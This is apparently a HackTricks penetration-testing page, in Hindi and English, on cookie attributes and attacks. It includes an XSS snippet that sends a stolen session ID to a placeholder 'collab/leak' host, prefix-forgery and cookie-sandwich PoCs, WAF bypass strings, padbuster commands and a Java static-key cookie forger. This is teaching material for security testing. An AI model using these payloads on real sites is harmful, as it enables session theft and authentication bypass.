# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Attributes

Cookies ब्राउज़र में अपनी व्यवहार नियंत्रित करने वाले कई attributes के साथ आती हैं। नीचे इन attributes का एक संक्षिप्त वर्णन passive voice में दिया गया है:

### Expires and Max-Age

किसी cookie की expiry date `Expires` attribute द्वारा निर्धारित होती है। इसके विपरीत, `Max-age` attribute सेकंड्स में वह समय परिभाषित करता है जब तक cookie हटाई जाएगी। **आधुनिक प्रैक्टिस के कारण `Max-age` को प्राथमिकता दें।**

### Domain

किस hosts को cookie प्राप्त करनी चाहिए, यह `Domain` attribute द्वारा निर्दिष्ट होता है। डिफ़ॉल्ट रूप से यह उस host पर सेट होता है जिसने cookie जारी की, जिसमें उसके subdomains शामिल नहीं होते। हालांकि, जब `Domain` attribute स्पष्ट रूप से सेट किया जाता है, तो यह subdomains को भी कवर करता है। यह `Domain` attribute को कम restrictive विकल्प बनाता है, उपयोगी उन मामलों में जहाँ subdomains के बीच cookie sharing आवश्यक हो। उदाहरण के लिए, `Domain=mozilla.org` सेट करने से cookies उसके subdomains जैसे `developer.mozilla.org` पर उपलब्ध हो जाएंगी।

### Path

`Path` attribute एक विशिष्ट URL path दर्शाता है जो requested URL में उपस्थित होना चाहिए ताकि `Cookie` header भेजा जाए। यह attribute `/` कैरेक्टर को directory separator की तरह मानता है, जिससे subdirectories में भी मैच की अनुमति मिलती है।

### Ordering Rules

जब दो cookies का नाम समान होता है, तो भेजने के लिए चुनी जाने वाली cookie निर्धारित होती है:

- requested URL में सबसे लंबे path से मेल खाने वाली cookie।
- अगर paths समान हों तो सबसे हाल ही में सेट की गई cookie।

### SameSite

- `SameSite` attribute यह निर्धारित करता है कि third-party domains से originating requests पर cookies भेजी जाएँगी या नहीं। इसके तीन सेटिंग्स हैं:
- **Strict**: third-party requests पर cookie भेजने पर रोक लगाता है।
- **Lax**: third-party websites द्वारा initiate किए गए GET requests के साथ cookie भेजने की अनुमति देता है।
- **None**: किसी भी third-party domain से cookie भेजने की अनुमति देता है।

याद रखें, cookies को configure करते समय इन attributes को समझना विभिन्न परिदृश्यों में अपेक्षित व्यवहार सुनिश्चित करने में मदद कर सकता है।

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
A cookie with _**SameSite**_ attribute will **mitigate CSRF attacks** where a logged session is needed.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
ध्यान दें कि अस्थायी रूप से, इस परिवर्तन को लागू करने के बाद, Chrome में **SameSite नीति के बिना cookies** को **पहले 2 मिनट के लिए None के रूप में ट्रीट किया जाएगा और फिर टॉप-लेवल cross-site POST request के लिए Lax के रूप में** माना जाएगा।

## Cookies Flags

### HttpOnly

यह सुनिश्चित करता है कि **client** cookie तक पहुँच न सके (उदाहरण के लिए **Javascript** के माध्यम से: `document.cookie`)

#### **Bypasses**

- यदि पेज किसी request के response के रूप में cookies भेज रहा है (उदाहरण के लिए एक **PHPinfo** पेज), तो XSS का दुरुपयोग करके उस पेज को request भेजकर response से cookies **चोरी** की जा सकती हैं (उदाहरण देखें [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- इसे **TRACE** **HTTP** requests के साथ bypass किया जा सकता है क्योंकि server से response (यदि यह HTTP method उपलब्ध है) भेजे गए cookies को reflect करेगा। इस तकनीक को **Cross-Site Tracking** कहा जाता है।
- आधुनिक ब्राउज़र इस तकनीक को रोकते हैं और JS से TRACE request भेजने की अनुमति नहीं देते। हालांकि, कुछ specific software में bypasses पाए गए हैं, जैसे IE6.0 SP2 में `\r\nTRACE` भेजना बजाय `TRACE` के।
- एक और तरीका ब्राउज़रों में zero/day vulnerabilities का exploitation है।
- Cookie Jar overflow attack करके HttpOnly cookies को overwrite करना भी संभव है:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- इन cookies को बाहर निकालने के लिए [**Cookie Smuggling**](#cookie-smuggling) attack का उपयोग किया जा सकता है
- यदि कोई server-side endpoint raw session ID को HTTP response में echo करता है (उदाहरण के लिए HTML comments या debug block के अंदर), तो आप XSS gadget का उपयोग करके उस endpoint को fetch कर सकते हैं, secret को regex करके और उसे exfiltrate कर सकते हैं। Example XSS payload pattern:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### सुरक्षित

अनुरोध **केवल** HTTP अनुरोध में cookie भेजेगा जब अनुरोध किसी सुरक्षित चैनल (आमतौर पर **HTTPS**) के माध्यम से प्रसारित किया गया हो।

## Cookies प्रिफिक्स

उन cookies जो `__Secure-` से शुरू होती हैं उन्हें उन पृष्ठों से सेट किए जाने पर `secure` फ़्लैग के साथ सेट किया जाना आवश्यक है जो HTTPS द्वारा सुरक्षित हैं।

जो cookies `__Host-` से शुरू होती हैं, उनके लिए कई शर्तें पूरी होनी चाहिए:

- इन्हें `secure` फ़्लैग के साथ सेट किया जाना चाहिए।
- ये ऐसे पृष्ठ से आनी चाहिए जो HTTPS द्वारा सुरक्षित हो।
- इनमें डोमेन निर्दिष्ट करना निषिद्ध है, जिससे ये सबडोमेन्स पर भेजे न जा सकें।
- इन cookies का path `/` पर सेट होना चाहिए।

यह ध्यान देने योग्य है कि `__Host-` वाले cookies को superdomains या subdomains को भेजने की अनुमति नहीं है। यह प्रतिबंध application cookies को अलग-थलग करने में मदद करता है। इसलिए, सभी application cookies के लिए `__Host-` प्रेफिक्स का उपयोग करना सुरक्षा और अलगाव बढ़ाने के लिए एक अच्छा अभ्यास माना जा सकता है।

### Cookies ओवरराइट करना

इसलिए, `__Host-` प्रिफिक्स वाली cookies की सुरक्षा में से एक यह है कि इन्हें subdomains से ओवरराइट होने से रोका जाए। उदाहरण के लिए [**Cookie Tossing attacks**](cookie-tossing.md) को रोकना। टॉक [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) में यह प्रदर्शित किया गया कि parser को trick करके subdomain से \_\_HOST- प्रिफिक्स वाली cookies सेट करना संभव था, उदाहरण के लिए शुरुआत में "=" जोड़कर या शुरुआत और अंत दोनों में जोड़कर...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

या PHP में cookie नाम की शुरुआत में **अन्य कैरेक्टर्स जोड़ना** संभव था जो बाद में **underscore से बदले** जाते थे, जिससे `__HOST-` cookies को ओवरराइट करने की अनुमति मिल जाती थी:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

ब्राउज़र और सर्वर के parsing में मौजूद असमानताओं का दुरुपयोग करते हुए cookie नाम के आगे एक Unicode whitespace code point जोड़ें। ब्राउज़र उस नाम को शब्दशः `__Host-`/`__Secure-` से शुरू नहीं मानेगा, इसलिए यह subdomain से सेट करने की अनुमति देता है। यदि backend cookie keys पर अग्रणी Unicode whitespace को trim/normalize करता है, तो वह संरक्षित नाम देखेगा और उच्च-प्रिविलेज cookie को ओवरराइट कर सकता है।

- एक subdomain से PoC जो parent-domain cookies सेट कर सकता है:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- समस्या को सक्षम करने वाला सामान्य backend व्यवहार:
- ऐसे frameworks जो cookie keys को trim/normalize करते हैं। In Django, Python’s `str.strip()` removes a wide range of Unicode whitespace code points, causing the name to normalize to `__Host-name`.
- आम तौर पर trim किए जाने वाले code points में शामिल हैं: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Many frameworks resolve duplicate cookie names as “last wins”, इसलिए attacker-controlled normalized cookie value वैध cookie को overwrite कर देता है।

- ब्राउज़र के अंतर मायने रखते हैं:
- Safari multibyte Unicode whitespace को cookie names में ब्लॉक करता है (उदा., rejects U+2000) परंतु अभी भी single-byte U+0085 और U+00A0 की अनुमति देता है, जिन्हें कई backends trim करते हैं। विभिन्न ब्राउज़रों में क्रॉस-टेस्ट करें।

- प्रभाव: `__Host-`/`__Secure-` cookies को कम-विश्वसनीय contexts (subdomains) से overwrite करने में सक्षम बनाता है, जिससे XSS (यदि reflected), CSRF token override, और session fixation हो सकता है।

- On-the-wire बनाम server view उदाहरण (नाम में U+2000 मौजूद):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Many backends split/parse and then trim, resulting in the normalized `__Host-name` taking the attacker’s value.

#### लेगेसी `$Version=1` cookie splitting on Java backends (prefix bypass)

कुछ Java stacks (e.g., Tomcat/Jetty-style) अभी भी legacy RFC 2109/2965 parsing को सक्षम रखते हैं जब `Cookie` header `$Version=1` से शुरू होता है। इससे सर्वर एक ही cookie string को multiple logical cookies के रूप में पुनर्व्याख्यायित कर सकता है और एक forged `__Host-` एंट्री स्वीकार कर सकता है जो मूल रूप से किसी subdomain या यहाँ तक कि असुरक्षित origin से सेट की गई थी।

- PoC जो legacy parsing को मजबूर करता है:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- क्यों यह काम करता है:
- क्लाइंट-साइड प्रीफ़िक्स चेक सेट करने के दौरान लागू होते हैं, लेकिन सर्वर-साइड का लेगेसी पार्सिंग बाद में header को विभाजित और सामान्यीकृत कर देता है, जिससे `__Host-`/`__Secure-` प्रीफ़िक्स गारंटी का उद्देश्य बाइपास हो जाता है।

- कहां कोशिश करें: Tomcat, Jetty, Undertow, या ऐसे frameworks जो अभी भी RFC 2109/2965 attributes का सम्मान करते हैं। इसे duplicate-name overwrite semantics के साथ मिलाएँ।

#### Duplicate-name last-wins overwrite primitive

जब दो cookies एक ही नाम पर normalize हो जाते हैं, कई backends (जिसमें Django शामिल है) आख़िरी occurrence का उपयोग करते हैं। smuggling/legacy-splitting के बाद दो `__Host-*` नाम बनते हैं, तो सामान्यतः attacker-controlled वाला जीतता है।

#### Detection and tooling

इन स्थितियों की जाँच के लिए Burp Suite का उपयोग करें:

- कई leading Unicode whitespace code points आज़माएँ: U+2000, U+0085, U+00A0 और देखें कि backend इन्हें ट्रिम करके नाम को prefixed के रूप में ट्रीट करता है या नहीं।
- Cookie header में पहले `$Version=1` भेजें और जाँचें कि backend लेगेसी splitting/normalization करता है या नहीं।
- उन दो cookies को inject करके जो एक ही नाम पर normalize होते हैं, duplicate-name resolution (first vs last wins) का निरीक्षण करें।
- इसे automate करने के लिए Burp Custom Action: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Decoding और normalization में mismatches बाइपास का मूल कारण हैं।

## कुकीज़ पर हमले

यदि किसी custom cookie में संवेदनशील डेटा है तो उसे जाँचें (खासकर अगर आप CTF खेल रहे हैं), क्योंकि यह vulnerable हो सकता है।

### Decoding and Manipulating Cookies

कुकीज़ में एम्बेड संवेदनशील डेटा हमेशा जाँचा जाना चाहिए। Base64 या समान फॉर्मैट में एन्कोड की गई कुकीज़ अक्सर decode की जा सकती हैं। यह कमजोरी हमलावरों को कुकी की सामग्री बदलने और अपना संशोधित डेटा वापस कुकी में एन्कोड करके अन्य उपयोगकर्ताओं की नकल करने की अनुमति देती है।

### Session Hijacking

यह हमला किसी उपयोगकर्ता की कुकी चुराने और एप्लिकेशन में उसके अकाउंट तक अनधिकृत पहुँच प्राप्त करने से संबंधित है। चुराई गई कुकी का उपयोग करके हमलावर वैध उपयोगकर्ता की नकल कर सकता है।

### Session Fixation

इस परिदृश्य में, हमलावर पीड़िता को किसी विशेष कुकी का उपयोग करके लॉग इन करने के लिए धोखा देता है। यदि एप्लिकेशन लॉगिन के समय नई कुकी असाइन नहीं करता, तो मूल कुकी रखने वाला हमलावर पीड़िता की नकल कर सकता है। यह तकनीक इस बात पर निर्भर करती है कि पीड़िता हमलावर द्वारा दी गई कुकी के साथ लॉगिन करे।

If you found an **subdomain में XSS** or you **किसी सबडोमेन को नियंत्रित करते हैं**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

यहाँ, हमलावर पीड़िता को हमलावर की session cookie का उपयोग करने के लिए मनाता है। पीड़िता, मानकर कि वह अपने ही अकाउंट में लॉग इन है, अनजाने में हमलावर के अकाउंट के संदर्भ में क्रियाएँ करेगी।

If you found an **subdomain में XSS** or you **किसी सबडोमेन को नियंत्रित करते हैं**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

ऊपर के लिंक पर क्लिक करके JWT में संभावित दोषों की व्याख्या करने वाले पृष्ठ पर जाएँ।

Cookie में उपयोग किए गए JSON Web Tokens (JWT) भी कमजोरियाँ दर्शा सकते हैं। संभावित दोषों और उनका शोषण कैसे किया जा सकता है, इस पर गहराई से जानकारी के लिए hacking JWT पर लिंक किए गए दस्तावेज़ का अध्ययन करने की सलाह दी जाती है।

### Cross-Site Request Forgery (CSRF)

यह हमला किसी लॉग-इन उपयोगकर्ता को उस वेब एप्लिकेशन पर अनचाही क्रियाएँ करने के लिए मजबूर करता है जिसमें वह वर्तमान में प्रमाणीकृत है। हमलावर उन कुकीज़ का शोषण कर सकते हैं जो हर अनुरोध के साथ उस कमजोर साइट पर स्वतः भेजी जाती हैं।

### Empty Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) ब्राउज़र नाम के बिना कुकीज़ बनाने की अनुमति देते हैं, जिसे नीचे JavaScript के माध्यम से दिखाया जा सकता है:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
भेजे गए cookie header में परिणाम `a=v1; test value; b=v2;` है। रोचक रूप से, यदि एक खाली नाम cookie सेट किया गया है तो यह cookies के हेरफेर की अनुमति देता है, और खाली cookie को किसी विशिष्ट मान पर सेट करके अन्य cookies को नियंत्रित करने की संभावना हो सकती है:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
यह ब्राउज़र एक cookie header भेजता है, जिसे प्रत्येक web server द्वारा नाम `a` और मान `b` वाले cookie के रूप में व्याख्यायित किया जाता है।

#### Chrome बग: Unicode Surrogate Codepoint समस्या

Chrome में, अगर किसी set cookie का हिस्सा एक Unicode surrogate codepoint हो, तो `document.cookie` भ्रष्ट हो जाता है और बाद में खाली string लौटाता है:
```js
document.cookie = "\ud800=meep"
```
This results in `document.cookie` outputting an empty string, indicating permanent corruption.

#### पार्सिंग समस्याओं के कारण Cookie Smuggling

(अधिक विवरणों के लिए देखें [original research](https://blog.ankursundara.com/cookie-bugs/)) कई वेब सर्वर, जिनमें Java (Jetty, TomCat, Undertow) और Python (Zope, cherrypy, web.py, aiohttp, bottle, webob) शामिल हैं, पुराने RFC2965 समर्थन के कारण cookie strings को गलत तरीके से हैंडल करते हैं। वे double-quoted cookie value को एकल value के रूप में पढ़ लेते हैं, भले ही उसमें semicolons हों, जो सामान्यतः key-value pairs को अलग करना चाहिए:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Undertow, Zope, और Python के `http.cookie.SimpleCookie` और `http.cookie.BaseCookie` का उपयोग करने वाले सर्वर cookies को गलत तरीके से पार्स करते हैं, जिससे cookie injection attacks के मौके बनते हैं। ये सर्वर नए cookies की शुरुआत को सही तरह से सीमांकित करने में असफल होते हैं, जिससे हमलावर cookies को spoof कर सकते हैं:

- Undertow expects a new cookie immediately after a quoted value without a semicolon.
- Zope looks for a comma to start parsing the next cookie.
- Python's cookie classes start parsing on a space character.

यह vulnerability उन web applications के लिए खासतौर से खतरनाक है जो cookie-based CSRF protection पर निर्भर करती हैं, क्योंकि यह हमलावरों को spoofed CSRF-token cookies inject करने की अनुमति देती है, जिससे security measures को bypass किया जा सकता है। समस्या Python के duplicate cookie names के handling से और बिगड़ती है, जहाँ आखिरी occurrence पहले वाले को override कर देती है। यह insecure contexts में `__Secure-` और `__Host-` cookies के लिए भी चिंता पैदा करती है और जब cookies ऐसे back-end servers को भेजी जाती हैं जो spoofing के प्रति संवेदनशील हैं, तो यह authorization bypasses का कारण बन सकती है।

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), यह संभव हो सकता है कि cookie attribute **`$Version=1`** का उपयोग करके backend RFC2109 के कारण cookie पार्स करने के लिए पुरानी लॉजिक का उपयोग कर दे। इसके अलावा, अन्य मान जैसे **`$Domain`** और **`$Path`** का उपयोग cookie के साथ backend के व्यवहार को बदलने के लिए किया जा सकता है।

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) यह संभव है कि cookie sandwich technique का उपयोग करके HttpOnly cookies चोरी की जा सकें। ये आवश्यकताएँ और चरण हैं:

- किसी ऐसी जगह को ढूँढें जहाँ स्पष्ट रूप से बेकार **cookie is refected in the response**
- **Create a cookie called `$Version`** with value `1` (ou can do this in a XSS attack from JS) with a more specific path so it gets the initial possition (some frameworks like python don’t need this step)
- **Create the cookie that is reflected** with a value that leaves an **open double quotes** and with a specific path so it’s positioned in the cookie db after the previous one (`$Version`)
- Then, the legit cookie will go next in the order
- **Create a dummy cookie that closes the double quotse** inside its value

इस तरह victim cookie नए cookie version 1 के अंदर फंस जाती है और जब भी वह reflect होती है तब उसे reflect किया जा सकता है।
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

पिछले अनुभाग को देखें।

#### Bypassing value analysis with quoted-string encoding

यह parsing cookies के अंदर escaped values को unescape करने का संकेत देता है, इसलिए `"\a"` `"a"` बन जाता है। यह WAFS को बाइपास करने में उपयोगी हो सकता है, जैसे:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

RFC2109 में बताया गया है कि **कोमा (comma) को cookie values के बीच separator के रूप में उपयोग किया जा सकता है**। और इसके अलावा equal sign के पहले और बाद में **spaces और tabs जोड़े जा सकते हैं**। इसलिए `$Version=1; foo=bar, abc = qux` जैसा cookie `"foo":"bar, admin = qux"` cookie जनरेट नहीं करता बल्कि यह cookies `foo":"bar"` और `"admin":"qux"` बनाता है। ध्यान दें कि कैसे 2 cookies बनते हैं और admin से equal sign के पहले और बाद का space हट गया है।

#### Bypassing value analysis with cookie splitting

अंत में विभिन्न backdoors अलग-अलग cookie headers में पास की गई अलग-अलग cookies को एक स्ट्रिंग में जोड़ सकते हैं, जैसे:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
जो इस उदाहरण की तरह WAF को bypass करने की अनुमति दे सकता है:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### अतिरिक्त कमजोर Cookies जाँच

#### **बुनियादी जाँच**

- हर बार जब आप **login** करते हैं तो **cookie** **एक ही** रहती है।
- लॉग आउट करें और उसी **cookie** का उपयोग करने की कोशिश करें।
- उसी खाते में उसी **cookie** का उपयोग करके 2 डिवाइस (या ब्राउज़र) से login करने की कोशिश करें।
- यह जाँचें कि **cookie** में कोई जानकारी है या नहीं और इसे संशोधित करने की कोशिश करें।
- लगभग एक जैसे **username** वाले कई **accounts** बनाकर देखें और जाँचें कि क्या आप समानताएँ देख सकते हैं।
- अगर मौजूद हो तो **"remember me"** विकल्प देखें कि यह कैसे काम करता है। अगर यह मौजूद है और कमजोर हो सकता है, तो हमेशा किसी अन्य **cookie** के बिना केवल **remember me** की **cookie** का उपयोग करें।
- पासवर्ड बदलने के बाद भी क्या पिछली **cookie** काम करती है यह जाँचें।

#### **उन्नत cookies हमले**

यदि **cookie** login करते समय समान (या लगभग) रहती है, तो इसका मतलब हो सकता है कि **cookie** आपके account के किसी field (संभावतः **username**) से संबंधित है। फिर आप कर सकते हैं:

- बहुत सारे **accounts** बनाएं जिनके **username** बहुत **समान** हों, और यह अनुमान लगाने की कोशिश करें कि algorithm कैसे काम कर रहा है।
- कोशिश करें कि **bruteforce the username** करें। अगर **cookie** केवल आपके username के authentication method के रूप में सेव होती है, तो आप username "**Bmin**" के साथ एक account बना सकते हैं और अपनी **cookie** के हर single **bit** को **bruteforce** कर सकते हैं क्योंकि उन cookies में से एक जो आप आज़माएंगे वह "**admin**" की होगी।
- Try **Padding** **Oracle** (आप **cookie** की सामग्री को decrypt कर सकते हैं)। Use **padbuster**।

**Padding Oracle - Padbuster उदाहरण**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster कई बार प्रयास करेगा और आपसे पूछेगा कि कौन‑सी त्रुटि स्थिति है (वह जो मान्य नहीं है)।

फिर यह cookie को decrypt करना शुरू कर देगा (इसमें कुछ मिनट लग सकते हैं)

यदि attack सफलतापूर्वक किया गया है, तो आप अपनी इच्छा का कोई string encrypt करने की कोशिश कर सकते हैं। उदाहरण के लिए, यदि आप **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
यह निष्पादन आपको cookie सही तरीके से encrypted और encoded करके देगा जिसमें स्ट्रिंग **user=administrator** शामिल होगी।

**CBC-MAC**

शायद किसी cookie में कोई value हो और उसे CBC का उपयोग करके signed किया गया हो। तब, उस value की integrity वही हस्ताक्षर (signature) होती है जो उसी value के साथ CBC का उपयोग कर बनाई जाती है। चूँकि IV के लिए null vector का उपयोग करने की सिफारिश की जाती है, यह प्रकार का integrity checking vulnerable हो सकता है।

**The attack**

1. यूज़रनेम **administ** = **t** का हस्ताक्षर प्राप्त करें  
2. यूज़रनेम **rator\x00\x00\x00 XOR t** = **t'** का हस्ताक्षर प्राप्त करें  
3. cookie में value **administrator+t'** सेट करें (जहाँ **t'** **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00** का वैध हस्ताक्षर होगा)

**ECB**

यदि cookie ECB का उपयोग करके encrypted है तो वह vulnerable हो सकता है.\
जब आप लॉग इन करते हैं तो जो cookie आपको मिलता है वह हमेशा एक जैसा होना चाहिए।

How to detect and attack:

- लगभग समान डेटा (username, password, email, आदि) वाले 2 users बनाएं और दिए गए cookie में किसी पैटर्न का पता लगाने की कोशिश करें
- उदाहरण के लिए "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" नाम का एक user बनाएं और cookie में किसी पैटर्न की जाँच करें (जैसा कि ECB हर ब्लॉक को एक ही key से encrypt करता है, यदि username encrypt हो रहा है तो समान encrypted bytes दिखाई दे सकते हैं)  
- वहां एक पैटर्न होना चाहिए (उपयोग किए गए ब्लॉक के आकार के साथ). इसलिए, यह जानकर कि कई "a" कैसे encrypt होते हैं आप एक username बना सकते हैं: "a"\*(size of the block)+"admin". फिर, आप cookie से "a" के एक ब्लॉक के encrypted पैटर्न को हटा सकते हैं. और आपके पास username "admin" का cookie होगा.

### Static-key cookie forgery (symmetric encryption of predictable IDs)

कुछ applications authentication cookies इस तरह बनाती हैं कि केवल एक predictable value (उदाहरण के लिए numeric user ID) को एक global, hard-coded symmetric key के तहत encrypt करके और फिर ciphertext को encode (hex/base64) कर दिया जाता है। यदि key product- या install-स्तर पर static है, तो कोई भी arbitrary users के लिए offline cookies forge कर सकता है और authentication को bypass कर सकता है।

How to test/forge
- ऐसे cookie(s) पहचानें जो auth को gate करते हैं, उदाहरण के लिए COOKIEID और ADMINCOOKIEID.
- cipher/encoding निर्धारित करें। एक वास्तविक मामले में app ने IDEA का उपयोग किया constant 16-byte key के साथ और ciphertext को hex के रूप में लौटाया गया।
- अपने user ID को encrypt करके और इसे जारी किए गए cookie से तुलना करके सत्यापित करें। यदि यह मेल खाता है, तो आप किसी भी target ID के लिए cookies mint कर सकते हैं (1 अक्सर पहले admin से जुड़ा होता है)।
- forged value को सीधे cookie के रूप में सेट करें और ब्राउज़ करें; किसी credentials की आवश्यकता नहीं है।

<details>
<summary>Minimal Java PoC (IDEA + hex) used in the wild</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>संदर्भ (e.g., server-side session with random ID, or add anti-replay properties).

## संदर्भ

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
